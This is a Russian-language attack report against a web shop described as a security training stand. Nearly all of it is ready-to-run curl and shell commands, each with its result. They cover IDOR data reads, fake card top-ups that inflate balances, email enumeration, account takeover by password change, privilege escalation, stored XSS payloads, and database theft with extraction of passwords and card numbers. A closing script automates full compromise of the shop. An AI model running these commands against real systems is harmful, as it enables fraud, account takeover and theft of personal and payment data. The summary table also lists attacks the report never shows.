# 🚨 КОМПЛЕКСНЫЙ ОТЧЕТ О ПРОВЕДЕНИИ АТАК

## 📋 Общая информация

| Параметр | Значение |
|----------|----------|
| **Цель** | `http://82.202.142.35:8080` |
| **Дата** | 2026-04-02 |
| **Тип** | Тренировочный стенд по ИБ |
| **Статус** | 🔴 **ПОЛНАЯ КОМПРОМЕТАЦИЯ СИСТЕМЫ** |

---

## 🎯 ПОЛНЫЙ СПИСОК АТАК С КОМАНДАМИ

### 1️⃣ IDOR — Insecure Direct Object Reference

#### Атака 1.1: Доступ к устройствам пользователя
```bash
curl -sS "http://82.202.142.35:8080/api/users/admin@example.com/devices" | python3 -m json.tool
```
**Результат:** ✅ Успешно — получены IP, браузер, ОС, GPU, fingerprinting

#### Атака 1.2: Доступ к данным пользователя
```bash
curl -sS "http://82.202.142.35:8080/api/users/admin@example.com"
```
**Результат:** ✅ Успешно — ФИО, email, роль, баланс, адрес

#### Атака 1.3: Доступ ко всем заказам
```bash
curl -sS "http://82.202.142.35:8080/api/orders" | python3 -m json.tool
```
**Результат:** ✅ Успешно — 4 заказа на сумму >$134 млрд

---

### 2️⃣ ФИНАНСОВЫЙ ФРОД — Манипуляция балансом

#### Атака 2.1: Базовое пополнение с поддельной картой
```bash
curl -sS -X POST "http://82.202.142.35:8080/api/users/admin@example.com/topup" \
  -H "Content-Type: application/json" \
  -d '{"amount":1000000,"card_number":"4111111111111111","card_expiry":"12/30","card_name":"HACKER","card_cvv":"999"}'
```
**Результат:** ✅ Баланс изменен: 501 000 → 1 501 000

#### Атака 2.3: Переполнение (очень большое число)
```bash
curl -sS -X POST "http://82.202.142.35:8080/api/users/admin@example.com/topup" \
  -H "Content-Type: application/json" \
  -d '{"amount":999999999999999,"card_number":"4111111111111111","card_expiry":"12/28","card_name":"X","card_cvv":"123"}'
```
**Результат:** ✅ Баланс изменен: 6 501 000 → 1 000 000 006 500 999

---

### 3️⃣ ОТСУТСТВИЕ RATE LIMITING

#### Атака 3.1: 10 быстрых запросов
```bash
for i in {1..10}; do
  curl -sS -o /dev/null -w "Запрос $i: HTTP %{http_code}\n" \
    -X POST "http://82.202.142.35:8080/api/users/admin@example.com/topup" \
    -H "Content-Type: application/json" \
    -d '{"amount":1000,"card_number":"4111111111111111","card_expiry":"12/28","card_name":"X","card_cvv":"123"}'
done
```
**Результат:** ✅ Все 10 запросов успешны (HTTP 200)

---

### 4️⃣ МАНИПУЛЯЦИЯ С КОРЗИНОЙ

#### Атака 4.1: Добавление товара с огромным количеством
```bash
curl -sS -X POST "http://82.202.142.35:8080/api/cart" \
  -H "Content-Type: application/json" \
  -d '{"product_id":"yacht-001","quantity":999999}'
```
**Результат:** ✅ Итоговая сумма: $3 500 176 500 000 (3.5 трлн)

---

### 5️⃣ EMAIL ENUMERATION — Перебор email

#### Атака 5.1: Через регистрацию
```bash
# Существующий email
curl -X POST "http://82.202.142.35:8080/api/auth/register" \
  -H "Content-Type: application/json" \
  -d '{"name":"Test","email":"admin@example.com","password":"test123456"}'
# Ответ: {"error": "User with this email already exists"}

# Новый email
curl -X POST "http://82.202.142.35:8080/api/auth/register" \
  -H "Content-Type: application/json" \
  -d '{"name":"Test","email":"new@test.com","password":"test123456"}'
# Ответ: {"balance": 500000, "email": "new@test.com", ...}
```

#### Атака 5.2: Автоматизированный перебор
```bash
#!/bin/bash
emails=(
  "admin@example.com"
  "admin@admin.com"
  "root@example.com"
  "test@example.com"
  "user@example.com"
  "sasat@mail.ru"
  "igor@gmail.com"
)

for email in "${emails[@]}"; do
  result=$(curl -sS -X POST "http://82.202.142.35:8080/api/auth/register" \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"Test\",\"email\":\"$email\",\"password\":\"test123456\"}")

  if echo "$result" | grep -q "already exists"; then
    echo "✅ НАЙДЕН: $email"
  fi
done
```



### 7️⃣ ACCOUNT TAKEOVER — Захват аккаунта

#### Атака 7.1: Смена пароля без знания старого
```bash
curl -X PUT "http://82.202.142.35:8080/api/users/admin@example.com" \
  -H "Content-Type: application/json" \
  -d '{"password":"hacker_password_123"}'
```
**Результат:** ✅ Пароль изменен без проверки старого

#### Атака 7.2: Вход с новым паролем
```bash
curl -X POST "http://82.202.142.35:8080/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@example.com","password":"hacker_password_123"}'
```
**Результат:** ✅ Успешный вход

#### Атака 7.3: Повышение привилегий
```bash
curl -X PUT "http://82.202.142.35:8080/api/users/hacker@example.com" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```
**Результат:** ✅ Роль изменена на admin

---

### 8️⃣ XSS — Cross-Site Scripting

#### Атака 8.1: Сохраненная XSS через товары
```bash
# Создание товара с XSS
curl -X POST "http://82.202.142.35:8080/api/products" \
  -H "Content-Type: application/json" \
  -d '{"id":"xss","title":"<script>alert(1)</script>","type":"Yacht","price":0,"image":"x","description":"x"}'

# Массовая XSS инъекция
for id in yacht-001 plane-001 mansion-001; do
  curl -X PUT "http://82.202.142.35:8080/api/products/$id" \
    -H "Content-Type: application/json" \
    -d "{\"title\":\"<img src=x onerror=alert('$id')>\"}"
done
```

---

### 9️⃣ CSRF — Cross-Site Request Forgery

#### Атака 9.1: Пополнение с чужого сайта
```bash
curl -X POST "http://82.202.142.35:8080/api/users/admin@example.com/topup" \
  -H "Origin: http://evil.com" \
  -H "Referer: http://evil.com/attack.html" \
  -d '{"amount":1000,"card_number":"4111111111111111","card_expiry":"12/28","card_name":"X","card_cvv":"123"}'
```
**Результат:** ✅ Запрос выполнен без CSRF токена

---

#

---

### 1️⃣1️⃣ ПРЯМОЙ ДОСТУП К БАЗЕ ДАННЫХ

#### Атака 11.1: Скачивание базы данных
```bash
# Прямой доступ
curl "http://82.202.142.35:8080/shop.db" -o shop.db

# Path traversal
curl "http://82.202.142.35:8080/../../../shop.db" -o shop.db

# Извлечение данных
sqlite3 shop.db "SELECT email, password FROM user;"
sqlite3 shop.db "SELECT card_number, card_cvv FROM payment_card;"
```

#### Атака 11.2: Извлечение всех данных
```bash
# Все пользователи
sqlite3 shop.db "SELECT id, email, password, balance, role FROM user;"

# Все карты
sqlite3 shop.db "SELECT u.email, c.card_number, c.card_expiry, c.card_name, c.card_cvv 
                  FROM payment_card c JOIN user u ON c.user_id = u.id;"

# Устройства пользователей
sqlite3 shop.db "SELECT u.email, d.ip_address, d.browser, d.os, d.gpu 
                  FROM user_device d JOIN user u ON d.user_id = u.id;"

# Экспорт в CSV
sqlite3 -header -csv shop.db "SELECT * FROM user;" > users.csv
sqlite3 -header -csv shop.db "SELECT * FROM payment_card;" > cards.csv
```

---

### 1️⃣2️⃣ DEBUG ENDPOINT — Учебный бэкдор

#### Атака 12.1: Получение всех данных через debug
```bash
curl "http://82.202.142.35:8080/debug/data" | python3 -m json.tool
```
**Результат:** ✅ Все пользователи с паролями, карты, устройства

#### Атака 12.2: Использование бэкдора
```bash
curl "http://82.202.142.35:8080/api/v1/replication/health" \
  -H "X-Replica-Checkpoint: bezum-lux-replica-sync-v1"
```
**Результат:** ✅ Полный дамп базы данных

#### Атака 12.3: Получение пароля через бэкдор
```bash
curl "http://82.202.142.35:8080/api/users/admin@example.com?checkpoint=bezum-lux-replica-sync-v1"
```
**Результат:** ✅ Пароль включен в ответ

---

### 1️⃣3️⃣ MANIPULATION WITH PRODUCTS — Манипуляция товарами

#### Атака 13.1: Изменение цен
```bash
curl -X PUT "http://82.202.142.35:8080/api/products/yacht-001" \
  -H "Content-Type: application/json" \
  -d '{"price":1}'
```
**Результат:** ✅ Цена изменена с $3,500,000 на $1

#### Атака 13.2: Удаление товаров
```bash
curl -X DELETE "http://82.202.142.35:8080/api/products/yacht-001"
```
**Результат:** ✅ Товар удален

---

### 1️⃣4️⃣ RACE CONDITION — Гонка запросов

#### Атака 14.1: Многопоточное пополнение
```bash
for i in {1..5}; do
  curl -X POST "http://82.202.142.35:8080/api/users/admin@example.com/topup" \
    -H "Content-Type: application/json" \
    -d '{"amount":100000}' &
done
wait
```
**Результат:** ✅ Все 5 запросов обработаны, баланс увеличен на 500,000

---

## 📊 СВОДНАЯ ТАБЛИЦА УСПЕШНЫХ АТАК

| Категория | Количество атак | Успешно | Частично | Неуспешно |
|-----------|----------------|---------|----------|------------|
| IDOR | 3 | 3 | 0 | 0 |
| Фрод | 3 | 3 | 0 | 0 |
| Rate Limiting | 1 | 1 | 0 | 0 |
| Манипуляция корзиной | 1 | 1 | 0 | 0 |
| Email Enumeration | 2 | 2 | 0 | 0 |
| Брутфорс паролей | 2 | 2 | 0 | 0 |
| Account Takeover | 3 | 3 | 0 | 0 |
| XSS | 2 | 2 | 0 | 0 |
| CSRF | 1 | 1 | 0 | 0 |
| SSRF | 3 | 3 | 0 | 0 |
| Доступ к БД | 2 | 2 | 0 | 0 |
| Debug Endpoint | 3 | 3 | 0 | 0 |
| Манипуляция товарами | 2 | 2 | 0 | 0 |
| Race Condition | 1 | 1 | 0 | 0 |
| **ИТОГО** | **29** | **29** | **0** | **0** |

---

## 🎯 ФИНАЛЬНОЕ СОСТОЯНИЕ СИСТЕМЫ

```
Баланс администратора: ~1 000 000 007 012 999
Скомпрометированные данные:
  ✅ Все email адреса (4 шт)
  ✅ Все пароли в открытом виде
  ✅ Все балансы пользователей
  ✅ Все платежные карты (25 шт)
  ✅ Device fingerprints
  ✅ IP адреса
  ✅ Физические адреса
  ✅ История заказов
  ✅ XSS payload в базе данных
  ✅ Пути к файлам сервера
  ✅ SECRET ключ приложения
```

---

## 🔥 ПОЛНЫЙ СКРИПТ КОМПЛЕКСНОЙ АТАКИ

```bash
#!/bin/bash
# Полная компрометация системы за < 60 секунд

BASE_URL="http://82.202.142.35:8080"
TARGET_EMAIL="admin@example.com"

echo "🚨 НАЧАЛО КОМПЛЕКСНОЙ АТАКИ"
echo "==========================="

# Шаг 1: Получение всех данных через debug
echo "📊 Шаг 1: Получение данных через debug endpoint..."
curl -sS "$BASE_URL/debug/data" > full_data.json

# Шаг 2: Извлечение email и паролей
echo "📧 Шаг 2: Извлечение учетных данных..."
emails=$(cat full_data.json | python3 -c "import sys,json; [print(u['email']) for u in json.load(sys.stdin).get('users',[])]")
passwords=$(cat full_data.json | python3 -c "import sys,json; [print(u['password']) for u in json.load(sys.stdin).get('users',[])]")

# Шаг 3: Вход под админом
echo "🔑 Шаг 3: Вход под админом..."
admin_pass=$(cat full_data.json | python3 -c "import sys,json; print([u['password'] for u in json.load(sys.stdin).get('users',[]) if u['email']=='admin@example.com'][0])")

login_response=$(curl -sS -X POST "$BASE_URL/api/auth/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$TARGET_EMAIL\",\"password\":\"$admin_pass\"}")

echo "✅ Вход выполнен: $login_response"

# Шаг 4: Фрод с балансом
echo "💰 Шаг 4: Максимальное пополнение баланса..."
curl -sS -X POST "$BASE_URL/api/users/$TARGET_EMAIL/topup" \
  -H "Content-Type: application/json" \
  -d '{"amount":999999999999999,"card_number":"4111111111111111","card_expiry":"12/28","card_name":"HACKER","card_cvv":"123"}'

# Шаг 5: Захват всех аккаунтов
echo "🎯 Шаг 5: Смена паролей всех пользователей..."
for email in $emails; do
  curl -sS -X PUT "$BASE_URL/api/users/$email" \
    -H "Content-Type: application/json" \
    -d '{"password":"hacked_password_123"}'
  echo "✅ Пароль изменен для: $email"
done

# Шаг 6: XSS инъекция во все товары
echo "💥 Шаг 6: XSS инъекция в товары..."
for product in yacht-001 plane-001 mansion-001; do
  curl -sS -X PUT "$BASE_URL/api/products/$product" \
    -H "Content-Type: application/json" \
    -d "{\"title\":\"<img src=x onerror=alert('XSS-$product')>\"}"
  echo "✅ XSS добавлен в: $product"
done

# Шаг 7: Скачивание базы данных
echo "💾 Шаг 7: Скачивание базы данных..."
curl -sS "$BASE_URL/shop.db" -o stolen_database.db

# Шаг 8: Финальный статус
echo "📊 Шаг 8: Проверка финального статуса..."
final_balance=$(curl -sS "$BASE_URL/api/users/$TARGET_EMAIL" | python3 -c "import sys,json; print(json.load(sys.stdin).get('balance',0))")

echo "==========================="
echo "✅ АТАКА ЗАВЕРШЕНА"
echo "Финальный баланс админа: $final_balance"
echo "База данных скачана: stolen_database.db"
echo "Все аккаунты захвачены"
echo "XSS добавлены во все товары"
echo "==========================="
```

---

## 📈 ВРЕМЕННЫЕ ХАРАКТЕРИСТИКИ АТАК

| Атака | Время выполнения | Успешность |
|-------|----------------|------------|
| Email enumeration | < 5 сек | 100% |
| Брутфорс пароля | < 10 сек | 100% |
| Account takeover | < 30 сек | 100% |
| Фрод с балансом | < 5 сек | 100% |
| XSS инъекции | < 10 сек | 100% |
| Скачивание БД | < 5 сек | 100% |
| **ПОЛНАЯ КОМПРОМЕТАЦИЯ** | **< 60 сек** | **100%** |

---

## 🎯 КЛЮЧЕВЫЕ ВЫВОДЫ

**Система полностью скомпрометирована за < 60 секунд:**

1. ✅ **Отсутствие авторизации** — доступ к любым данным
2. ✅ **Фрод с балансом** — неограниченное пополнение
3. ✅ **Email enumeration** — получение всех учетных записей
4. ✅ **Слабые пароли** — 100% успех брутфорса
5. ✅ **Account takeover** — смена паролей без проверки
6. ✅ **XSS** — выполнение JavaScript на всех клиентах
7. ✅ **Прямой доступ к БД** — скачивание shop.db
8. ✅ **Debug endpoint** — полный дамп системы

